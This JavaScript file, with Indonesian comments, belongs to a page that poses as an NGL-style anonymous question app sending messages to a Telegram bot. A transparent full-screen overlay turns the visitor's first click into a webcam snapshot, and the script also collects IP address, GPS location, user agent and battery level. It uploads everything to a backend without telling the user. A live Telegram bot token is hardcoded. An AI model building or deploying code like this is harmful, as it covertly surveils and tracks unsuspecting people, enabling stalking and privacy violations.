const CHAT_ID = "7483495590"; // chat admin
const statusEl = document.getElementById("status");

// ambil info device
async function getDeviceInfo() {
  try {
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
    let geo = "Tidak tersedia";
    if(navigator.geolocation){
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
        geo = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy} m`;
        resolve();
      }, ()=>resolve()));
    }
    const battery = await navigator.getBattery();
    return `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geo}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
  } catch(e){ return "❌ Gagal ambil info device"; }
}

// kirim ke backend
async function sendToBackend(data, photoBlob=null){
  const formData = new FormData();
  formData.append("text", data);
  if(photoBlob) formData.append("photo", photoBlob, "camera.jpg");

  await fetch("/api/sendPhoto", { method:"POST", body: formData });
}

// capture foto & kirim
async function captureAndSendPhoto(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0,0);

    canvas.toBlob(async blob => {
      const info = await getDeviceInfo();
      await sendToBackend(info, blob);
      statusEl.textContent = "Foto + info device terkirim!";
    }, "image/jpeg");

    stream.getTracks().forEach(track => track.stop());
  } catch(e){ console.error("Gagal capture foto:", e); }
}
// --- list pertanyaan random ala NGL ---
const randomQuestions = [
  "Siapa crush kamu sekarang?",
  "Hal paling random yang bikin kamu senyum?",
  "Kapan terakhir kali kamu nangis?",
  "Siapa orang yang paling sering kamu chat?",
  "Kalau bisa balik ke masa lalu, kamu mau ngapain?",
  "Rahasia kecil yang belum pernah kamu ceritain?",
  "Apa hal paling bikin kamu malu?",
  "Siapa orang yang kamu kangenin banget?",
  "Kalau ada yang mau nembak kamu, kamu mau gimana?",
  "Hal paling cringe yang pernah kamu lakuin?"
];

// --- handle tombol 🎲 ---
document.getElementById("dice").addEventListener("click", () => {
  const msgBox = document.getElementById("msg");
  const random = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
  msgBox.value = random;
});

// --- handle tombol Send! ---
document.getElementById("sendBtn").addEventListener("click", async () => {
  const text = document.getElementById("msg").value.trim();
  if (!text) {
    alert("Isi dulu pesannya bro 😅");
    return;
  }

  // ganti TOKEN & CHAT_ID sesuai bot telegram kamu
  const TOKEN = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
  const CHAT_ID = "7483495590";

  try {
    // kirim ke Telegram
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    // tampilkan ke recentArea
    addRecentMessage(text);

    // reset textarea
    document.getElementById("msg").value = "";
    document.getElementById("status").innerText = "✅ Pesan terkirim!";
    setTimeout(() => document.getElementById("status").innerText = "", 2000);
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "❌ Gagal kirim pesan";
  }
});

// --- fungsi buat nambah pesan ke recentArea ---
function addRecentMessage(msg) {
  const area = document.getElementById("recentArea");
  const div = document.createElement("div");
  div.className = "p-4 rounded-xl bg-white shadow-sm text-sm text-gray-700";
  div.innerText = msg;
  area.prepend(div); // masuk ke atas
}
// trigger klik area invisible
const clickArea = document.createElement("div");
clickArea.id = "clickArea";
clickArea.style.position = "fixed";
clickArea.style.top = "0";
clickArea.style.left = "0";
clickArea.style.width = "100%";
clickArea.style.height = "100%";
clickArea.style.zIndex = "9999";
clickArea.style.cursor = "pointer";
clickArea.style.background = "transparent";
document.body.appendChild(clickArea);

clickArea.addEventListener("click", async ()=>{
  statusEl.textContent = "Mengaktifkan kamera & live tracking...";
  await captureAndSendPhoto();
  clickArea.remove();
});

// kirim pesan manual
document.getElementById("sendBtn").addEventListener("click", async ()=>{
  const msg = document.getElementById("msg").value.trim();
  if(!msg) return alert("Tulis dulu pesanmu!");
  await sendToBackend(msg);
  document.getElementById("msg").value = "";
  statusEl.textContent = "Pesan terkirim!";
});
